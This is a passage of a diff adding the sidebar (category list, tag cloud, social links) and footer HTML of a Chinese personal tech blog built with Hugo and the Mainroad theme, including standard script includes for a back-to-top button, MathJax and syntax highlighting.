+	<h4 class="widget__title">分类</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/">前端基础</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6/">前端框架</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/">后端开发</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0/">开发日记</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8E%9F%E7%90%86/">计算机原理</a>
+			</li>
+		</ul>
+	</div>
+</div>
+<div class="widget-taglist widget">
+	<h4 class="widget__title">标签</h4>
+	<div class="widget__content">
+		<a class="widget-taglist__link widget__link btn" href="/tags/database/" title="Database">Database (6)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/git/" title="Git">Git (3)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/golang/" title="Golang">Golang (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/html&#43;css/" title="HTML&#43;CSS">HTML&#43;CSS (2)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/hybrid/" title="Hybrid">Hybrid (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/javascript/" title="JavaScript">JavaScript (10)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/linux/" title="Linux">Linux (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/ms/" title="MS">MS (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/nginx/" title="nginx">nginx (2)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/node/" title="node">node (13)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/npm&#43;package/" title="npm&#43;package">npm&#43;package (5)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/react%E6%8A%80%E6%9C%AF%E6%A0%88/" title="React技术栈">React技术栈 (6)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/ssr/" title="SSR">SSR (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/typescript/" title="TypeScript">TypeScript (3)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/vue%E6%8A%80%E6%9C%AF%E6%A0%88/" title="Vue技术栈">Vue技术栈 (5)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BDai/" title="人工智能(AI)">人工智能(AI) (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E5%9B%A2%E9%98%9F/" title="团队">团队 (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E5%B7%A5%E7%A8%8B%E5%8C%96/" title="工程化">工程化 (7)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/" title="异步编程">异步编程 (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/" title="数据结构与算法">数据结构与算法 (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7/" title="文档工具">文档工具 (7)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E6%97%A5%E5%B8%B8%E5%B7%A5%E5%85%B7/" title="日常工具">日常工具 (2)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/" title="浏览器">浏览器 (9)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E7%BC%96%E7%A8%8B%E5%B7%A5%E5%85%B7/" title="编程工具">编程工具 (2)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/" title="网络原理">网络原理 (5)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E8%84%9A%E6%89%8B%E6%9E%B6/" title="脚手架">脚手架 (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" title="设计模式">设计模式 (1)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84/" title="软件架构">软件架构 (2)</a>
+	</div>
+</div>
+<div class="widget-social widget">
+	<h4 class="widget-social__title widget__title">社交</h4>
+	<div class="widget-social__content widget__content">
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="GitHub" rel="noopener noreferrer" href="https://github.com/lianpf" target="_blank">
+				<svg class="widget-social__link-icon icon icon-github" width="24" height="24" viewBox="0 0 384 374"><path d="m192 0c-106.1 0-192 85.8-192 191.7 0 84.7 55 156.6 131.3 181.9 9.6 1.8 13.1-4.2 13.1-9.2 0-4.6-.2-16.6-.3-32.6-53.4 11.6-64.7-25.7-64.7-25.7-8.7-22.1-21.3-28-21.3-28-17.4-11.9 1.3-11.6 1.3-11.6 19.3 1.4 29.4 19.8 29.4 19.8 17.1 29.3 44.9 20.8 55.9 15.9 1.7-12.4 6.7-20.8 12.2-25.6-42.6-4.8-87.5-21.3-87.5-94.8 0-20.9 7.5-38 19.8-51.4-2-4.9-8.6-24.3 1.9-50.7 0 0 16.1-5.2 52.8 19.7 15.3-4.2 31.7-6.4 48.1-6.5 16.3.1 32.7 2.2 48.1 6.5 36.7-24.8 52.8-19.7 52.8-19.7 10.5 26.4 3.9 45.9 1.9 50.7 12.3 13.4 19.7 30.5 19.7 51.4 0 73.7-44.9 89.9-87.7 94.6 6.9 5.9 13 17.6 13 35.5 0 25.6-.2 46.3-.2 52.6 0 5.1 3.5 11.1 13.2 9.2 76.2-25.5 131.2-97.3 131.2-182 0-105.9-86-191.7-192-191.7z"/></svg>
+				<span>GitHub</span>
+			</a>
+		</div>
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="Email" href="mailto:wanderlian@outlook.com">
+				<svg class="widget-social__link-icon icon icon-mail" width="24" height="24" viewBox="0 0 416 288"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg>
+				<span>wanderlian@outlook.com</span>
+			</a>
+		</div>
+
+		
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="微信公众号：连先生有猫病" rel="noopener noreferrer" href="https://mp.weixin.qq.com/mp/profile_ext?action=home&amp;__biz=MzAwNDk2OTI1Mg==&amp;scene=124#wechat_redirect" target="_blank">
+					<svg t="1613746391336" class="widget-social__link-icon  icon" width="24" height="24" viewBox="0 0 1030 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1661" width="200" height="200"><path d="M697.6 275.2C620.8 179.2 499.2 121.6 371.2 128 166.4 128 0 256 0 422.4c0 83.2 44.8 160 115.2 211.2l-57.6 172.8L262.4 704c38.4 6.4 76.8 12.8 115.2 12.8h51.2c-32-38.4-44.8-89.6-51.2-140.8-6.4-160 134.4-281.6 320-300.8zM448 275.2c0-19.2 12.8-32 32-32h25.6c19.2 0 32 12.8 32 32v25.6c0 19.2-12.8 32-32 32h-25.6c-19.2 0-32-12.8-32-32v-25.6z m-166.4 12.8c0 19.2-12.8 32-32 32h-25.6c-19.2 0-32-12.8-32-32v-25.6c0-19.2 12.8-32 32-32h25.6c19.2 0 32 12.8 32 32v25.6z" fill="#e6e6e6" p-id="1662"></path><path d="M1024 556.8c0-121.6-128-224-288-224S448 435.2 448 556.8c0 128 128 224 288 224 38.4 0 76.8-6.4 115.2-19.2l179.2 83.2-64-160c32-25.6 57.6-76.8 57.6-128z m-390.4-51.2c0 19.2-12.8 32-32 32H576c-19.2 0-32-12.8-32-32v-25.6c0-19.2 12.8-32 32-32h25.6c19.2 0 32 12.8 32 32v25.6z m268.8 0c0 19.2-12.8 32-32 32h-25.6c-19.2 0-32-12.8-32-32v-25.6c0-19.2 19.2-32 32-32h25.6c19.2 0 32 12.8 32 32v25.6z" fill="#e6e6e6" p-id="1663"></path></svg>
+				<span>微信公众号：连先生有猫病</span>
+			</a>
+		</div>
+		
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="知乎" rel="noopener noreferrer" href="https://www.zhihu.com/people/liu-lang-zhe-51-90/posts" target="_blank">
+					<svg t="1613712910226" class="widget-social__link-icon  icon" width="24" height="24" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8513" width="200" height="200"><path d="M544.949 561.422s0-71.387-34.779-75.050c-34.779-3.663-142.775 0-142.775 0v-219.654h161.078s-1.83-73.219-32.949-73.219h-261.755l43.93-117.148s-65.897 3.663-89.692 45.761-98.844 252.604-98.844 252.604 25.627 10.983 67.726-20.134c42.101-31.116 56.743-86.033 56.743-86.033l76.879-3.663 1.83 223.316s-133.621-1.83-161.078 0c-27.457 1.83-42.101 75.050-42.101 75.050h203.182s-18.307 124.47-69.557 214.164c-53.085 89.692-151.929 161.078-151.929 161.078s71.387 29.287 140.947-10.983c69.557-42.101 120.811-223.316 120.811-223.316l162.912 203.182s14.643-97.013-1.83-124.47c-18.307-27.457-113.49-137.283-113.49-137.283l-42.101 36.607 29.287-120.811h177.552zM587.050 188.010l-1.83 660.793h65.897l23.795 82.37 115.321-82.37h162.912v-660.793h-366.091zM879.92 775.584h-76.879l-97.013 75.050-21.965-75.050h-20.134v-512.527h215.991v512.527z" fill="" p-id="8514"></path></svg>
+				<span>知乎</span>
+			</a>
+		</div>
+		
+	</div>
+</div>
+</aside>
+		</div>
+		
+		
+
+<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2016 - 2023 曜灵（SUN）Site.
+			<span class="footer__copyright-credits">基于 <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> 引擎和 <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> 主题</span>
+		</div>
+	</div>
+</footer>
+
+
+<script src="https://unpkg.com/vanilla-back-to-top@7.1.14/dist/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  cornerOffset: 100,
+  diameter: 56,
+  backgroundColor: '#63B8FF',
+  innerHTML: '<svg viewBox="0 0 24 24"><path d="M4 12l1.41 1.41L11 7.83V20h2V7.83l5.58 5.59L20 12l-8-8-8 8z"/></svg>',
+  textColor: '#fff'
+})</script>
+	</div>
+<script async defer src="/js/menu.js"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
+
+<script src="/js/highlight/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
